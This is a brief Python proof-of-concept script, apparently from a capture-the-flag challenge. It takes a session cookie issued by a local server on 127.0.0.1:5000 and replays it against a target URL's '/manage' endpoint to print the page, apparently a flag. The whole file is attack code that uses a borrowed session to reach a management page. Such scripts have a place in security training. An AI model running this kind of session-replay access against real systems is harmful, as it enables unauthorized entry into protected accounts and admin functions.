import requests
import string
import sys


def handle_response(d):
	print(d)

if len(sys.argv) < 2:
	print("[+] python3 poc.py <url>")
	exit()

URL = sys.argv[1]

def getSession():
	r = requests.get('http://127.0.0.1:5000')
	session = r.cookies['session']
	print(session)
	return session

def getFlag():
	cookies = {"session":getSession()}
	r = requests.get(url=URL+'/manage',cookies=cookies)
	print(r.text)

if __name__ == '__main__':
	getFlag()